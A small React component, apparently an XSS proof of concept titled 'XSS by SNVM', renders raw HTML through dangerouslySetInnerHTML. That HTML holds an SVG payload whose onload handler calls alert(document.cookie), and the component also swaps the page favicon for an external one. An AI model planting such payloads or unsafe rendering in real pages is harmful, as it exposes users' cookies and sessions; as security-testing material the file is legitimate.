import React, { useEffect } from "react";

function TesXss() {
  useEffect(() => {
    // Set the title
    document.title = "XSS by SNVM";

    // Set the favicon
    const favicon = document.querySelector('link[rel="icon"]');
    if (favicon) {
      favicon.href = "https://d1pspl52z5rk07.cloudfront.net/static/favicon.ico";
    }
  }, []);
  const htmlContent = `
    <!DOCTYPE html>
    <html lang="en" class="">
    <head>
      <meta charset="utf-8" />
      <head>
		<body>
    <svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.cookie)"/>
    </body>
    </html>
  `;

  // Use the dangerouslySetInnerHTML prop to render the HTML content
  return <div dangerouslySetInnerHTML={{ __html: htmlContent }} />;
}

export default TesXss;
